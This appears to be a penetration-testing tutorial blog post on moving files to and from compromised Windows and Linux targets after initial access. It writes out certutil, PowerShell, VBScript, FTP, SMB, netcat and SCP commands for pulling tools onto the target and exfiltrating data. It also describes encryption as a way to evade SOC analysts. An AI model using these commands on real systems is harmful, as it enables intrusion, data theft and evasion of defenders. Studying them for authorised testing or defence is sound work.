@@ -1,0 +1,223 @@
+(Almost) All The Ways to File Transfer
+
+Introduction
+
+File Transfer is a crucial, and in most cases, an inevitable step of Post-Exploitation. You’ve successfully gained initial access on your target machine, and with file transfers, you can upload tools on the target to try and elevate your privileges, exfiltrate sensitive data from the target back to your machine or just move around files to/from the target and you.
+
+Today, we’ll cover some of the popular (and not popular) ways to file transfer from our attacker machine (preferrably Kali Linux) to a Windows or Linux target. I’ll cover how to set up a server on the attacker machine and then show how the target get download the file and vice versa. At the end, we’ll cover the weaknesses of plaintext file transfers and demonstrate some encrypted methods of file transfer.
+
+NOTE: Medium’s formatting makes “e”s that are enclosed incode blocks and are italicised have a trailing space following it. To show an example: this "file ". THERE IS NO SPACE AFTER THE “e”. However, there are some cases where there is supposed to be a space after the “e”; you just have to use your senses :P
+Easiest, Most Common File Transfer Method
+HTTP
+
+Arguably, the simplest and most convenient method of File Transfer is using HTTP. You can easily set up a HTTP server on your attacker machine in a specific directory that you want to be the root of the server, with just one command.
+
+SimpleHTTPServer
+SimpleHTTPServer Server
+
+python -m SimpleHTTPServer [port] uses a module in Python called SimpleHTTPServer, which, as the name suggests, starts up a HTTP Server. It uses port 8000 by default, but you can change that by specifying the port number at the end.
+
+There are only 2 very, very minor downsides of SimpleHTTPServer and that is the fact that (1) when you Ctrl+C to stop the server, it gives you a mess of errors and (2) this isn’t the shortest command to set up a HTTP server.
+
+http.server
+Http.server Server
+
+python3 -m http.server [port] uses a lesser known module in Python 3 called http.server, and it sets up a HTTP server, on port 8000 by default, just like SimpleHTTPServer. But the advantages of http.server over SimpleHTTPServer are:
+1. You don’t get that mess of errors when you stop the server
+2. It’s a shorter, easier to type command
+3. Who doesn’t love Python3 ;)
+
+Just one word of warning about HTTP servers is that whatever directory you run the command in becomes the root directory of the HTTP server, which means you won’t be able to access files that are lower in the filesystem.
+
+Apache
+A longer method to start up a HTTP server, in the case that Python or the modules are not available on your machine, is by using Apache.
+
+First, move the file you want to transfer to the /var/www/html directory with mv file /var/www/html/ and start the Apache2 service with service apache2 start. We can verify that the server is indeed running and serving our file by browsing to our file in a web browser.
+Apache2 HTTP Server
+
+On the Target…
+
+On the target, for both Windows and Linux, if you have GUI access, you can simply open up a web browser and download the files you want. For CLI ways to download files from a HTTP server, check the Windows and Linux sections below (namely certutil/powershell/vbscript for Windows and wget/curl for Linux).
+Windows File Transfer
+HTTP
+
+Certutil.exe
+Certutil is hands down probably the easiest way to file transfer to a Windows machine. Certutil.exe is originally meant for certificate and CA management, but is now abused by attackers as a method of file transfer.
+
+Once you have set up your HTTP server with SimpleHTTPServer, http.server or Apache, simply run this command on the target:
+certutil -urlcache -split -f "http://ip-addr:port/file" [output-file]
+Certutil HTTP Download
+
+Powershell
+Powershell is an advanced version of the standard cmd.exe with scripting capabilities. It is installed by default in Windows 7 and 2008, and later versions. You can use a Powershell one-liner to download a file from a HTTP server, like this:
+powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
+
+One thing to note: you MUST use single quotes for the URL and output file, and using double quotes will not work (I can tell you this because I spent 10 minutes trying to figure out why my Powershell command didn’t work).
+Powershell HTTP Download
+
+VBScript
+VBScript, or Visual Basic Scripting Edition, is another language with which you can download files with. I generally don’t prefer using VBScript as you need to individually insert tens of lines of commands into a file to execute (in reality you would copy paste the commands all at once, but it’s still a hassle), but if your target is a Windows XP or 2003, you might consider using this method every now and then.
+
+Here’s the full list of commands (you can find a better-formatted version here):
+
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
+echo Err.Clear >> wget.vbs 
+echo Set http = Nothing >> wget.vbs 
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
+echo http.Open "GET", strURL, False >> wget.vbs 
+echo http.Send >> wget.vbs 
+echo varByteArray = http.ResponseBody >> wget.vbs 
+echo Set http = Nothing >> wget.vbs 
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
+echo strData = "" >> wget.vbs 
+echo strBuffer = "" >> wget.vbs 
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
+echo Next >> wget.vbs 
+echo ts.Close >> wget.vbs
+
+To run our wget.vbs script, run cscript wget.vbs http://ip-addr:port/file output-file.
+VBScript HTTP Download
+FTP
+
+Pyftpdlib
+FTP is another common method of file transfer, and FTP clients are usually installed by default on Windows machines. The Python module pyftpdlib allows you to quickly set up an FTP server, hassle-free. You can install it using sudo apt-get install python-pyftpdlib as shown below:
+Pyftpdlib Installation
+
+Once downloaded, simply set up an FTP server with python -m pyftpdlib [-p port]. The default port pyftpdlib uses is port 2121. You can also append the
+-w option to allow anonymous write, so that the target can anonymously upload files to the attacker machine.
+Pyftpdlib Server
+
+Pure-ftpd
+You can download pure-ftpd with sudo apt-get install pure-ftpd
+Pure-ftpd Installation
+
+To start the FTP server, run service pure-ftpd start.
+Pure-ftpd Server
+
+To verify that the service is indeed running, run service pure-ftpd status. To close down the server, run service pure-ftpd stop.
+
+On the Target…
+Most of the times, the initial shell we gain on the target won’t be interactive, which means running an interactive command which requires further input from the user (e.g. text editor, FTP connection) won’t work properly, and can crash the shell. But FTP requires user interaction, so how do we work around this?
+
+The trick is to create a file with all the FTP commands we need, and run it all at once. The file creation looks like this:
+
+echo open ip-addr > ftp.txt
+echo username >> ftp.txt
+echo password >> ftp.txt
+echo binary >> ftp.txt
+echo GET file.exe >> ftp.txt
+echo bye >> ftp.txt
+
+FTP Commands File Creation
+
+We are creating a connection to the attacking machine’s FTP server, with a username and password (in my case, anonymous login is allowed), to enable transfer of binary executable files, GET the executable file and close the connection.
+
+To run this whole file, use ftp -v -n -s:ftp.txt and you will see the commands being automatically executed.
+FTP File Download
+TFTP
+
+Atftpd
+Atftpd allows a quick setup of a TFTP server in Kali Linux, with just a single command atftpd --daemon --port 69 root-dir. You must specify the directory that the TFTP server will use as the root. As a side note, TFTP uses UDP as its transport layer protocol.
+
+On the Target…
+Windows XP and 2003 and earlier have a TFTP client pre-installed, whereas Windows 7 and 2008 and later need to be specifically installed. However, there are plenty of use cases for TFTP file transfers.
+
+To download/upload a file, use tftp -i ip-addr {GET | PUT} file.
+TFTP Download
+SMB
+
+SMB is another convenient file transfer protocol, which is very common amongst Windows environments. You can easily set up an SMB server with Impacket’s smbserver.py program like this:
+python /usr/share/doc/python-impacket/examples/smbserver.py share-name root-dir.
+smbserver.py SMB Server
+
+On the target, you can view the available shares on the SMB server with net view \\ip-addr. To view the files available in the share, simply use dir \\ip-addr\share-name.
+SMB Server Enumeration
+
+To actually download a file, use copy \\ip-addr\share-name\file out-file.
+SMB Download
+Linux File Transfer
+Wget (HTTP/FTP)
+
+Most Linux machines have the wget command pre-installed, so once you have set up a HTTP server, you can download the file easily with wget http://ip-addr[:port]/file[-o output-file].
+Wget HTTP Download
+
+A lesser known usage of wget is its ability to download FTP files as well. To do that, simply prepend a ftp:// before the URL. If the FTP server needs credentials, specify them with --ftp-user=username and
+--ftp-password=pass.
+Wget FTP Download
+
+One downside of this is that when it downloads an executable file, the file cannot be executed. Normal FTP server connections have a binary command to allow executable files to be preserved throughout the transfer, but wget doesn’t support this.
+Curl
+
+Most Linux targets, and OSX machines, have the curl command available out-of-the-box. Curl is similar to wget in that it provides an easy method of downloading files from an HTTP server.
+Curl HTTP Download
+Netcat (Standard TCP/Manual HTTP)
+
+Netcat, being the “swiss army knife of network hacking tools” it is, can also provide an easy method of file transfers. You can read how Netcat can be leveraged as a file transfer method using standard TCP connections in my other post.
+
+Netcat can also be used to manually download files from an HTTP server. You can nc to a HTTP server and send a GET request for a file. The one-liner is echo "GET /file HTTP/1.0" | nc -n ip-addr port > out-file && sed -i '1,7d' out-file.
+Netcat HTTP Download
+
+We redirect the download output to a file, and use sed to delete the first 7 lines of the file. But why? Since we are redirecting the raw output to the file, the HTTP GET response header is redirected as well, and if left untouched, can corrupt an executable file.
+Base 64 Encoding + Copy & Paste
+
+Now here’s an interesting one. We won’t be actually transferring a file across a network, but instead we will be copy-pasting executable files from our attacking machine to the target. But how can we copy and paste executable files, which are full of unprintable characters?
+
+The trick is by first encoding the file in Base 64. We can do this by using Python: python -c 'print(__import__("base64").b64encode(open("file", "rb").read()))'.
+Generating a Base 64 of the Executable
+
+Then, on the target, we can copy and paste the string into a .txt file with echo "string" > output.txt, and use base64 to decode the file, with base64 -d output.txt > output-file.
+Decoding the Base 64 File
+
+If Python is available, you can also run python -c 'print(__import__
+("base64").b64decode(open("string.txt", "r").read()))' > out-file.
+Encrypted & Secure File Transfer
+Problems with Plaintext & Benefits of Encrypted File Transfer
+
+The main problem with plaintext file transfers is … that it communicates in plaintext. Why is this bad? Because anyone can sniff the network and see the file that is being introduced or exfiltrated, which means certain people like SOC analysts can detect and see exactly what you are smuggling into the network and/or out from the network.
+
+Here’s a Wireshark capture of a curl http://192.168.1.2:8000
+/filetransfer.me to drive the point home.
+Plaintext HTTP Download Capture
+
+Following the HTTP stream shows us the HTTP GET request that was sent (shows the sending host and user agent [curl]), the file that was requested and the server’s response. As you can see, network sniffers can find out a lot about the plaintext communication between you and your target. This is why encrypted communication is important.
+Encrypted SCP Download Capture
+
+In this case, we’ve used the Secure Copy Protocol (SCP) to download a file over SSH. As you can see, you cannot identify what file the attacker tried to upload, nor its contents — you only see a jumbled mess. This is a much more secure way to download/upload files to/from the target. Now let’s take a look at how we can actually achieve encrypted file transfers.
+How to Perform Secure File Transfer
+
+The first, and the easier method is to use Ncat. Ncat can create a secure, encrypted connection over SSL/TLS. You can set up a listener on the target with ncat -nvlp port --ssl > out-file and connect to the listener from the attacking machine with ncat -nv target-ip port --ssl < file-to-send.
+Ncat SSL/TLS Download
+
+The second method is to use the Secure Copy Protocol, or SCP, which uses SSH to securely transfer files. You can start the SSH server easily on your Kali Linux with service ssh start.
+
+On the target, we need to create a file, line by line, which will enter the SSH password in, and download the remote file. The only reason that a one-liner doesn’t work is because SCP prompts the user for a password, and simply echoing the password and piping it to the command won’t work. The list of commands to build the file looks like this:
+
+echo '#!/usr/bin/expect' > scp.exp
+echo 'spawn scp username@ip-addr:/path-to-file out-file' >> scp.exp
+echo 'set pass "password"' >> scp.exp
+echo 'expect {' >> scp.exp
+echo 'password: {send "$pass\r"; exp_continue}' >> scp.exp
+echo '}' >> scp.exp
+
+To run this file, use expect scp.exp and securely download the file you want.
+
+You may need to create a new user for SSH to log into, if so, you can use the adduser username command and follow the prompt to set up a new user.
+
+Important note: you MUST use single quotes to surround the lines, as using double quotes will overlap with the double quotes that are included within the line, and will cause an issue with the first line.
+SCP Download
+Further Digging
+
+Other File Transfer Methods: https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/
+Certutil.exe: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
+Passing the password to SCP: https://stackoverflow.com/questions/
+50096/how-to-pass-password-to-scp
